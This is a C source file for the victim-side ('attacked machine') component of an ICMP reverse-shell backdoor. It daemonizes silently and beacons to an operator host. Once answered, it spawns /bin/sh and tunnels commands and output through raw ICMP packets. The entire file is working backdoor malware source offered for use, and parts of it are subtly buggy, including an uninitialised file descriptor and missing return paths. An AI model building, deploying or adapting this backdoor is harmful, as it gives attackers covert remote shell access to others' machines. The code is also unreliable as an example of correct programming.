/*
 * reverse-icmp-shell: server
 *
 * by: h3ndr1k
 * Inspirated by code from Peter Kieltyka (elux)
 * http://peter.eluks.com / peter@eluks.com
 *
 */

#include "header.h"

/* global variables */
int     ish_debug = 1;

/* function prototypes */
void    usage(char *);
void    sig_handle(int);
int     edaemon(void);
int     ish_listen(int, struct sockaddr *, socklen_t);
int     ish_beacon(int, struct sockaddr *, socklen_t);

void
usage(char *program) {
    fprintf(stderr,
    "\nICMP reverse-shell (attacked machine)   -   by: h3ndr1k\nInspirated by code from Peter Kieltyka (elux)\n"
    "usage: %s [options]\n\n"
    "options:\n"
    " -h               Display this screen\n"
    " -d               Run server in debug mode\n"
    " -i <id>          Set session id; range: 0-65535 (default: 1515)\n"
    " -t <type>        Set ICMP type (default: 8)\n"
    " -p <packetsize>  Set packet size (default: 512)\n"
    " -s <seconds>     Set time (in sec) between beacons (default: 1 )\n"
    "\nexample:\n"
    "%s -i 65535 -t 0 -p 1024 [host]\n"
    "\n", VERSION, program, program);

    exit(-1);
}

void
ish_timeout(int empty) {
    printf("failed.\n\n");
    exit(-1);
}

void
sig_handle(int empty) {
    return;
}

int
edaemon(void) {
    pid_t   pid;
    int     fd;

    if((pid = fork()) < 0) {
        return -1;
    } else if(pid != 0) {
        exit(0);
    }

    setsid();
    chdir("/");
    umask(0);

    if((fd = open("/dev/null", O_WRONLY, 0)) == -1)
        return -1;

    dup2(fd, STDIN_FILENO);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    
    close(fd);

    return 0;
}

int
ish_beacon(int sockfd, struct sockaddr *sin, socklen_t sinlen) {
    printf("waiting on reply...\n");
    fd_set  rset;
    int     n, fd, maxfd;
    char    send_buf[ish_info.packetsize], recv_buf[ish_info.packetsize];

    sendhdr.cntrl = 0;

    FD_ZERO(&rset);
    FD_SET(fd, &rset);
    FD_SET(sockfd, &rset);
    maxfd = MAX(fd, sockfd) + 1;

    select(maxfd, &rset, NULL, NULL, NULL);
    if(FD_ISSET(sockfd, &rset)) {
        memset(recv_buf, 0, sizeof(recv_buf));
        if(ish_recv(sockfd, recv_buf, sin, sinlen) == CNTRL_CPOUT) {
            write(fd, recv_buf, strlen(recv_buf));
            fprintf(stderr, "-----+ IN DATA +------\n%s", recv_buf);
            if(strstr(recv_buf, "beacon") != NULL){
                printf("no beacon returned\n");
                return(1);
            }else{
                printf("beacon returned\n");
                return(0);
            }
        }
    }
}

int
ish_listen(int sockfd, struct sockaddr *sin, socklen_t sinlen) {
    printf("Here is your shell...\n");
    fd_set  rset;
    int     n, fd, maxfd;
    char    send_buf[ish_info.packetsize], recv_buf[ish_info.packetsize];

    fd = popen2("/bin/sh");
    sendhdr.cntrl = 0;


    while(1) {
        FD_ZERO(&rset);

        FD_SET(fd, &rset);
        FD_SET(sockfd, &rset);
        maxfd = MAX(fd, sockfd) + 1;

        select(maxfd, &rset, NULL, NULL, NULL);

        if(FD_ISSET(sockfd, &rset)) {
            memset(recv_buf, 0, sizeof(recv_buf));
            if(ish_recv(sockfd, recv_buf, sin, sinlen) == CNTRL_CPOUT) {
                write(fd, recv_buf, strlen(recv_buf));
                fprintf(stderr, "-----+ IN DATA +------\n%s", recv_buf);
            }
        }

        if(FD_ISSET(fd, &rset)) {
            memset(send_buf, 0, sizeof(send_buf));

            sendhdr.ts = 0;
            ish_info.seq++;

            if ((n = read(fd, send_buf, sizeof(send_buf)-1)) == 0)
                sendhdr.cntrl |= CNTRL_CEXIT;

            fprintf(stderr, "-----+ OUT DATA +-----\n%s\n", send_buf);

            if (ish_send(sockfd, send_buf, sin, sinlen) < 0){}

            if(n == 0) break;
        }
    }

    pclose2(fd);
    return(0);
}

int
main(int argc, char *argv[]) {
    int     sockfd, delay;
    char    *host, opt;
    struct  sockaddr_in sin;
    struct  hostent *he;

    // default should be type 8
    ish_info.type = 8;
    delay = 1;
    while((opt = getopt(argc, argv, "hdi:t:p:s:")) != -1) {
        switch(opt) {
        	case 'h':
            	usage(argv[0]);
            	break;
        	case 'd':
            	ish_debug = 0;
            	break;
        	case 'i':
            	ish_info.id = atoi(optarg);
            	break;
        	case 't':
            	ish_info.type = atoi(optarg);
            	break;
        	case 'p':
            	ish_info.packetsize = atoi(optarg);
            	break;
            case 's':
                delay = atoi(optarg);
                break;
        }
    }
    host = argv[argc-1];

    //check if the host can be resolved
    if((he = gethostbyname(host)) == NULL) {
        fprintf(stderr, "Error: Cannot resolve %s!\n", host);
        exit(-1);
    }


    // allow running as daemon
    if(ish_debug) {
        if(edaemon() != 0) {
            fprintf(stderr, "Cannot start server as daemon!\n");
            exit(-1);
        }
    }

    printf("\nICMP reverse-shell v%s  (attacked machine)   -   by: h3ndr1k\nInspirated by code from Peter Kieltyka (elux)\n", VERSION);
    printf("\n--------------------------------------------------\n");

    //do some socket magic??
    sin.sin_family = AF_INET;
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    memset(&(sin.sin_zero), 0, 8);

    if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1){}
    
    //starting backdoor
    while(1){
        if(ish_send(sockfd, "", (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            printf("failed to send beacon.\n");
        }else{
            printf("sending beacon...\n");
        }
        if(ish_beacon(sockfd, (struct sockaddr *)&sin, sizeof(sin)) == 0){
            ish_listen(sockfd, (struct sockaddr *)&sin, sizeof(sin));
        }
        //time between beacons
        sleep(delay);
    }
    
    close(sockfd);
    exit(0);
}

